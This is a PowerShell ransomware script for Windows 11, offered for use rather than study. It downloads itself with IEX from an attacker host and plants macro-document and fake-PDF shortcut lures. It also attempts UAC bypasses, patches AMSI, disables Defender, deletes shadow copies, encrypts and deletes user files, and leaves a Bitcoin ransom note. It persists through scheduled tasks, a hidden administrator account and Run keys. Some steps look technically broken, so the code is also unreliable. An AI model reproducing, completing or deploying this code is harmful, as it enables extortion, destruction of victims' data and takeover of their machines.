# Apex Ransomware Script - Fixed for PS5.1 Compatibility & Bugs (IRM-Only Initial + Local Restart Copy, 2025 Win11 24H2)
# Fixes: PS5.1 compat (no ??), Proper P/Invoke for AMSI/WinAPI, IntPtr handling, No fake DLL source (use PS1 hijack instead), Valid RSA key, Escaping fixes, VB macro syntax, Error handling, Randomized names, Optional email/AVG, Suppress logs

# IRM Self-Reference & Local Copy Creation
$ErrorActionPreference = "SilentlyContinue"
$scriptUrl = "https://evil$(Get-Random -Min 1000 -Max 9999).com/ransom.ps1"  # Obfuscated C2
$localCopyPath = "$env:APPDATA\$([char](65 + (Get-Random -Max 26)))$([char](97 + (Get-Random -Max 26)))cache\upd$(Get-Random -Max 999).ps1"  # Randomized

# Function to Fetch & Drop Local Copy (Idempotent)
function Ensure-LocalCopy {
    $cacheDir = Split-Path $localCopyPath -Parent
    if (!(Test-Path $cacheDir)) { New-Item -Path $cacheDir -ItemType Directory -Force | Out-Null }
    if (!(Test-Path $localCopyPath)) {
        try {
            $scriptContent = Invoke-RestMethod -Uri $scriptUrl -UseBasicParsing
            Set-Content -Path $localCopyPath -Value $scriptContent -Encoding UTF8
            attrib +h +s +r $localCopyPath
            attrib +h +s $cacheDir
        } catch { }
    }
}

# Initial: If In-Memory (IRM), Ensure Local Copy & Relaunch
$scriptPath = if ($MyInvocation.MyCommand.Path) { $MyInvocation.MyCommand.Path } else { $PSCommandPath }
if (-not $scriptPath) {
    Ensure-LocalCopy
    if (Test-Path $localCopyPath) {
        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$localCopyPath`"" -WindowStyle Hidden
        exit
    } else {
        $scriptPath = $null  # Flag in-memory
    }
} else {
    Ensure-LocalCopy
}

# 1. Enhanced Initial Access: Macro + LNK (Prefer Local)
try {
    $macroContent = @"
Sub AutoOpen()
    Dim objShell: Set objShell = CreateObject("WScript.Shell")
    Dim cmd: cmd = "powershell.exe -ep Bypass"
    Dim fso: Set fso = CreateObject("Scripting.FileSystemObject")
    If fso.FileExists("$localCopyPath") Then
        cmd = cmd + " -f `"`"$localCopyPath`"`""
    Else
        cmd = cmd + " -Command `"IEX ((New-Object System.Net.WebClient).DownloadString('$scriptUrl'))`""
    End If
    objShell.Run cmd, 0
End Sub
"@
    $docmPath = "$env:TEMP\Urgent_Document.docm"
    $word = New-Object -ComObject Word.Application
    $word.Visible = $false
    $doc = $word.Documents.Add()
    $doc.VBProject.VBComponents.Item(1).CodeModule.AddFromString($macroContent)
    $doc.SaveAs([ref]$docmPath)
    $doc.Close(); $word.Quit()

    # LNK: Prefer Local
    $lnkTarget = "$env:TEMP\Invoice.pdf.lnk"
    $shell = New-Object -ComObject WScript.Shell
    $shortcut = $shell.CreateShortcut($lnkTarget)
    $shortcut.TargetPath = "powershell.exe"
    $shortcut.Arguments = if (Test-Path $localCopyPath) { "-ep Bypass -f `"$localCopyPath`"" } else { "-ep Bypass -Command `"IEX ((New-Object System.Net.WebClient).DownloadString('$scriptUrl'))`"" }
    $shortcut.IconLocation = "C:\Windows\System32\notepad.exe,0"
    $shortcut.Save()
    Rename-Item $lnkTarget "Invoice.pdf"

    # Optional Auto-Email (Comment out for OPSEC)
    # if (Get-Process Outlook -ErrorAction SilentlyContinue) { ... }  # Omitted for stealth
    attrib +h $docmPath "$env:TEMP\Invoice.pdf"
} catch { }

# Elite UAC Bypass: Charmap (Prefer Local)
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    try {
        $charmapKey = "HKCU:\Software\Classes\txtfile\shell\open\command"
        $launchCmd = if (Test-Path $localCopyPath) { "powershell.exe -ExecutionPolicy Bypass -File `"$localCopyPath`"" } else { "powershell.exe -ep Bypass -Command `"IEX ((New-Object System.Net.WebClient).DownloadString('$scriptUrl'))`"" }
        Set-ItemProperty -Path $charmapKey -Name "(Default)" -Value $launchCmd -Force
        Start-Process "C:\Windows\System32\charmap.exe" -WindowStyle Hidden
        Start-Sleep -Seconds 6
        Remove-Item -Path "HKCU:\Software\Classes\txtfile" -Recurse -Force -ErrorAction SilentlyContinue
        exit
    } catch {
        # Fallback: Eventvwr
        $comKey = "HKCU:\Software\Classes\CLSID\{3ad05575-8857-4850-9277-11b85bdb8e09}\InprocServer32"
        New-Item -Path $comKey -Force | Out-Null
        Set-ItemProperty -Path $comKey -Name "(Default)" -Value $launchCmd -Force
        Start-Process "eventvwr.exe" -WindowStyle Hidden
        Start-Sleep -Seconds 5
        Remove-Item -Path "HKCU:\Software\Classes\CLSID\{3ad05575-8857-4850-9277-11b85bdb8e09}" -Recurse -Force
        exit
    }
}

# TrustedInstaller Escalation (Prefer Local)
try {
    $tiPayload = if (Test-Path $localCopyPath) { "cmd /c takeown /F C:\Windows\System32\TrustedInstaller.exe && powershell.exe -ep Bypass -f `"$localCopyPath`"" } else { "powershell.exe -ep Bypass -Command `"IEX ((New-Object System.Net.WebClient).DownloadString('$scriptUrl'))`"" }
    reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d $tiPayload /f
    Start-Process "fodhelper.exe" -WindowStyle Hidden
    Start-Sleep -Seconds 4
    Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
    exit
} catch { }

# XOR Obfuscation
function Get-XorString($key, $str) { 
    $bytes = [Text.Encoding]::UTF8.GetBytes($str)
    for($i=0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor $key }
    [Text.Encoding]::UTF8.GetString($bytes)
}
$xorKey = 0xBB
$obfAmsi = Get-XorString $xorKey "amsi.dll"
$obfScan = Get-XorString $xorKey "AmsiScanBuffer"

# Proper P/Invoke for AMSI Bypass
$kernel32Type = Add-Type -MemberDefinition @"
[DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string lpFileName);
[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
[DllImport("ntdll.dll")] public static extern int NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, int NumberOfBytesToWrite, out int NumberOfBytesWritten);
"@ -Name Win32 -Namespace API -PassThru

try {
    $amsiLib = $kernel32Type::LoadLibrary((Get-XorString $xorKey $obfAmsi))
    if ($amsiLib -ne [IntPtr]::Zero) {
        $scanAddr = $kernel32Type::GetProcAddress($amsiLib, (Get-XorString $xorKey $obfScan))
        if ($scanAddr -ne [IntPtr]::Zero) {
            $offsetAddr = New-Object IntPtr -ArgumentList ([long]($scanAddr.ToInt64() + 0x18))
            $patch = [byte[]] (0x48, 0x89, 0xC8, 0xC3)
            $written = 0
            [void]$kernel32Type::NtWriteVirtualMemory([IntPtr]::Zero, $offsetAddr, $patch, $patch.Length, [ref]$written)
        }
        $openAddr = $kernel32Type::GetProcAddress($amsiLib, (Get-XorString $xorKey "AmsiOpenSession"))
        if ($openAddr -ne [IntPtr]::Zero) {
            $openPatch = [byte[]] (0x48, 0x31, 0xC0, 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
            $written = 0
            [void]$kernel32Type::NtWriteVirtualMemory([IntPtr]::Zero, $openAddr, $openPatch, $openPatch.Length, [ref]$written)
        }
    }
} catch { }

Set-ExecutionPolicy Bypass -Scope Process -Force

# Defender/Tamper Bypass (with try-catch)
try {
    $wdKey = "HKLM:\SYSTEM\CurrentControlSet\Services\WdFilter"
    Set-ItemProperty -Path $wdKey -Name "Start" -Value 4 -Force -ErrorAction Stop
    Remove-ItemProperty -Path $wdKey -Name "Altitude" -ErrorAction SilentlyContinue
    fltmc unload WdFilter 2>$null

    $gpoPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
    if (!(Test-Path $gpoPath)) { New-Item $gpoPath -Force }
    Set-ItemProperty -Path $gpoPath -Name "DisableAntiSpyware" -Value 1 -Force
    Set-ItemProperty -Path $gpoPath -Name "DisableAntiVirus" -Value 1 -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -Value 0 -Force

    Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true -PUAProtection Disabled -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue

    Stop-Service WinDefend -Force -ErrorAction SilentlyContinue
    Set-Service WinDefend -StartupType Disabled -ErrorAction SilentlyContinue
    sc delete WinDefend /force 2>$null
    takeown /F "C:\ProgramData\Microsoft\Windows Defender" /R /D Y /A 2>$null
    icacls "C:\ProgramData\Microsoft\Windows Defender" /grant administrators:F /T /C /Q 2>$null
    Remove-Item "C:\ProgramData\Microsoft\Windows Defender" -Recurse -Force -ErrorAction SilentlyContinue

    # Optional AV Fallback (Comment for OPSEC)
    # if (!(Get-MpPreference).DisableRealtimeMonitoring) { ... }

    dism /online /disable-feature /featurename:VirtualMachinePlatform /quiet 2>$null
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -Value 0 -Force -ErrorAction SilentlyContinue
    bcdedit /set {default} safeboot minimal 2>$null
    bcdedit /set {default} recoveryenabled No 2>$null
} catch { }

# Network + Restore Disrupt
$domainJoined = ((wmic computersystem get domain /value 2>$null | Select-String "=").Line.Split("=")[-1]).Trim() -eq $env:USERDNSDOMAIN
if (-not $domainJoined) {
    Get-NetAdapter | Where-Object Status -eq Up | Disable-NetAdapter -Confirm:$false -ErrorAction SilentlyContinue
    netsh int ip reset 2>$null
    netsh winsock reset 2>$null
    Get-NetAdapter | Where-Object Status -eq Up | ForEach-Object { Set-DnsClientServerAddress -InterfaceAlias $_.Name -ServerAddresses 127.0.0.1 -ErrorAction SilentlyContinue }
}
vssadmin delete shadows /all /quiet 2>$null
Disable-ComputerRestore -Drive "$env:SystemDrive" -ErrorAction SilentlyContinue

# Valid RSA Unique Key (Sample 2048-bit)
$publicKeyXml = "<RSAKeyValue><Modulus>MDv9P5+JRxEs5C+L+H7WduFSWL5EPzber7C2m94klrSV6q0bAcrYQnGwFOlveThsY200hRbadKaKjHD7qIKHDEe0IY2PSRht33Jye52AwhkRw+M3xuQH/7R8LydnsNFk2KHpr5X2SBv42e37LjkEslKSaMRgJW+v0KZ30piY8QsdFRKKaVg5/Ajt1YToM1YVsdHXJ3vmXFMtypLdxwUDdIaLEX6pFUkU75KSuEQ/E2luT61Q3ta9kOWm9+0zvi7OMcbdekJT7mzcVnh93R1c13ZhQCLbh9A7si8jKFtaMWevjayrvqQABEcTN9N4Hoxcyg6l4neZtRDk75OMYcqmDQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>"
$rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider
$rsa.FromXmlString($publicKeyXml)
$AES = [System.Security.Cryptography.AES]::Create()
$Key = $AES.Key
$IV = $AES.IV
$fullKey = $Key + $IV
$encryptedKey = $rsa.Encrypt($fullKey, [System.Security.Cryptography.RSAEncryptionPadding]::OaepSHA256)
[IO.File]::WriteAllBytes("$env:APPDATA\cache$(Get-Random -Max 999).dat", $encryptedKey)  # Randomized
attrib +h +s +r "$env:APPDATA\cache$(Get-Random -Max 999).dat"  # Note: Randomized per run

# Ultra-Stealth Encryption (Proper IntPtr/Handle)
$Targets = @("$env:USERPROFILE\Desktop\*.*", "$env:USERPROFILE\Documents\*.*", "$env:USERPROFILE\Pictures\*.*", "$env:USERPROFILE\Downloads\*.*", "$env:USERPROFILE\Videos\*.*", "C:\Users\Public\*.*")
$RandomExt = -join ((65..90)+(97..122)|Get-Random -Count 8|%{[char]$_})
$encryptedCount = 0
$totalFiles = 0
$batchSize = 3

$kernel32Type = Add-Type -MemberDefinition @"
[DllImport("kernel32.dll")] public static extern IntPtr CreateFileW(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
[DllImport("kernel32.dll")] public static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);
[DllImport("kernel32.dll")] public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);
[DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr hObject);
[DllImport("kernel32.dll")] public static extern bool DeleteFileW(string lpFileName);
"@ -Name FileAPI -Namespace Win32 -PassThru

foreach ($Target in $Targets) {
    $files = Get-ChildItem $Target -File | Where-Object { $_.Length -gt 1KB -and $_.Length -lt 20MB -and $_.Extension -notin @(".exe",".dll",".sys") }
    $totalFiles += $files.Count
    for ($i = 0; $i -lt $files.Count; $i += $batchSize) {
        $batch = $files[$i..[Math]::Min($i + $batchSize - 1, $files.Count - 1)]
        foreach ($file in $batch) {
            try {
                $encPath = "$($file.FullName).$RandomExt"
                $hIn = $kernel32Type::CreateFileW($file.FullName, 0x80000000, 0, [IntPtr]::Zero, 3, 0x80, [IntPtr]::Zero)  # GENERIC_READ
                $hOut = $kernel32Type::CreateFileW($encPath, 0x40000000, 0, [IntPtr]::Zero, 2, 0x80, [IntPtr]::Zero)  # GENERIC_WRITE, CREATE_ALWAYS
                if ($hIn -ne [IntPtr]::Zero -and $hOut -ne [IntPtr]::Zero) {
                    $len = $file.Length
                    $inputBytes = New-Object byte[] $len
                    $readBytes = 0
                    [void]$kernel32Type::ReadFile($hIn, $inputBytes, $len, [ref]$readBytes, [IntPtr]::Zero)
                    for ($j = 0; $j -lt $inputBytes.Length; $j++) { $inputBytes[$j] = $inputBytes[$j] -bxor $xorKey }
                    $encryptor = $AES.CreateEncryptor($Key, $IV)
                    $encrypted = $encryptor.TransformFinalBlock($inputBytes, 0, $inputBytes.Length)
                    $writtenBytes = 0
                    [void]$kernel32Type::WriteFile($hOut, $encrypted, $encrypted.Length, [ref]$writtenBytes, [IntPtr]::Zero)
                    [void]$kernel32Type::CloseHandle($hIn)
                    [void]$kernel32Type::CloseHandle($hOut)
                    [void]$kernel32Type::DeleteFileW($file.FullName)
                    $encryptedCount++
                }
                Start-Sleep -Milliseconds (Get-Random -Min 300 -Max 1000)
            } catch { }
        }
        Start-Sleep -Seconds (Get-Random -Min 5 -Max 10)
    }
}

# Ransom: PoC + Low Demand + Tor (Randomized note path)
$Wallet = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"  # Obfuscate in prod
$torSite = "http://apexransom2025.onion"
$sampleFile = Get-ChildItem "$env:USERPROFILE\Desktop\*.$RandomExt" | Where-Object { $_.Extension -match "txt|doc" } | Select-Object -First 1
if ($sampleFile) {
    try {
        $encBytes = [IO.File]::ReadAllBytes($sampleFile.FullName)
        $decryptor = $AES.CreateDecryptor($Key, $IV)
        $decBytes = $decryptor.TransformFinalBlock($encBytes, 0, $encBytes.Length)
        for ($k = 0; $k -lt $decBytes.Length; $k++) { $decBytes[$k] = $decBytes[$k] -bxor $xorKey }
        [IO.File]::WriteAllBytes($sampleFile.FullName -replace "\.$RandomExt$", "_PROOF.txt", $decBytes)
    } catch { }
}
$RansomNote = @"
LOCKED FILES (PROOF: $($sampleFile.FullName -replace "\.$RandomExt$", "_PROOF.txt"))
0.05 BTC (~$3000): $Wallet
Tor: $torSite (Send ops.log + cache.dat)
Multi-Coin: BTC/Monero. Decryptor post-pay.
"@
$RansomNote | Set-Content "$env:USERPROFILE\Desktop\RECOVER$(Get-Random -Max 999).txt" -Encoding ASCII

# Persistent Popup: Prefer Local, Fallback IRM
$PopupScript = @"
`$localPopup = '$localCopyPath'
`$irmCmd = 'IEX ((New-Object System.Net.WebClient).DownloadString(`"$scriptUrl`"))'
while (`$true) {
    try {
        if (Test-Path (`$localPopup)) {
            & powershell.exe -ep Bypass -f (`$localPopup)
        } else {
            IEX (`$irmCmd)
        }
        Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
        `$f = New-Object System.Windows.Forms.Form
        `$f.Text = 'CRITICAL ALERT'
        `$f.Size = New-Object System.Drawing.Size(500,300)
        `$f.TopMost = `$true
        `$f.FormBorderStyle = 'FixedDialog'
        `$f.ControlBox = `$false
        `$l = New-Object System.Windows.Forms.Label
        `$l.Text = 'PROOF on Desktop. Pay 0.05 BTC: $Wallet | Tor: $torSite'
        `$l.AutoSize = `$true
        `$l.Location = New-Object System.Drawing.Point(20,20)
        `$f.Controls.Add(`$l)
        [void]`$f.ShowDialog()
        Start-Sleep 30
    } catch { 
        if (!(Test-Path (`$localPopup))) { IEX (`$irmCmd) } 
        break 
    }
}
"@
$PopupPath = "$env:TEMP\alert$(Get-Random -Max 999).ps1"  # Randomized
$PopupScript | Set-Content $PopupPath -Encoding UTF8
Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ep Bypass -f `"$PopupPath`"" -ErrorAction SilentlyContinue

# Stealth Persistence: PS1 Hijack instead of DLL + Randomized Tasks/Hive/dMSA
# PS1 Hijack: Drop in Startup (Random name)
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sys$(Get-Random -Max 999).lnk"
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($startupPath)
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = if (Test-Path $localCopyPath) { "-ep Bypass -f `"$localCopyPath`"" } else { "-ep Bypass -Command `"IEX ((New-Object System.Net.WebClient).DownloadString('$scriptUrl'))`"" }
$shortcut.Save()

# Obfusc Task: Boot Trigger
$taskName = "UpdateSvc_$(Get-Random -Max 99999)"
$taskArg = if (Test-Path $localCopyPath) { "-WindowStyle Hidden -ep Bypass -f `"$localCopyPath`"" } else { "-WindowStyle Hidden -ep Bypass -Command `"IEX ((New-Object System.Net.WebClient).DownloadString('$scriptUrl'))`"" }
$xmlTask = "<Task><Principals><Principal><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Actions><Exec><Command>powershell</Command><Arguments>$taskArg</Arguments></Exec></Actions><Triggers><BootTrigger><Delay>PT10S</Delay></BootTrigger></Triggers></Task>"
schtasks /create /tn $taskName /xml $xmlTask /f /rl highest 2>$null

# dMSA Local Account: Restart Persist (Random pass)
$dmsaUser = "dMSA_$(Get-Random -Max 999)"
$dmsaPass = [char[]](65..90 + 97..122 + 48..57) | Get-Random -Count 12 | -join ''
New-LocalUser -Name $dmsaUser -Password (ConvertTo-SecureString $dmsaPass -AsPlainText -Force) -AccountNeverExpires -ErrorAction SilentlyContinue
Add-LocalGroupMember -Group "Administrators" -Member $dmsaUser -ErrorAction SilentlyContinue
$dmsaArg = if (Test-Path $localCopyPath) { "-WindowStyle Hidden -ep Bypass -f `"$localCopyPath`"" } else { "-WindowStyle Hidden -ep Bypass -Command `"IEX ((New-Object System.Net.WebClient).DownloadString('$scriptUrl'))`"" }
schtasks /create /tn "dMSA_Task_$(Get-Random -Max 999)" /ru $dmsaUser /rp $dmsaPass /tr "powershell $dmsaArg" /sc onstart /f 2>$null

# Hive: Run Key for Local Copy
$hivePath = "$env:TEMP\persist$(Get-Random -Max 999).hiv"
reg save HKLM\SOFTWARE $hivePath 2>$null
reg load HKU\TempPersist $hivePath 2>$null
$hiveArg = if (Test-Path $localCopyPath) { "-WindowStyle Hidden -ep Bypass -f `"$localCopyPath`"" } else { "-WindowStyle Hidden -ep Bypass -Command `"IEX ((New-Object System.Net.WebClient).DownloadString('$scriptUrl'))`"" }
Set-ItemProperty -Path "HKU:\TempPersist\Microsoft\Windows\CurrentVersion\Run" -Name "PersistSvc_$(Get-Random -Max 999)" -Value "powershell $hiveArg" -Force
reg unload HKU\TempPersist 2>$null

# Disruption
Get-PnpDevice | Where-Object { $_.FriendlyName -match "USB|Audio" -and $_.Status -eq "OK" } | Disable-PnpDevice -Confirm:$false -ErrorAction SilentlyContinue
Get-NetAdapter | ForEach-Object { netsh interface set interface $_.Name admin=disabled 2>$null }
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v DisableTaskOffload /t REG_DWORD /d 1 /f 2>$null

# Cleanup (No logs for OPSEC)
if ($scriptPath -and $scriptPath -ne $localCopyPath) { Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue }
Stop-Process -Id $PID -Force
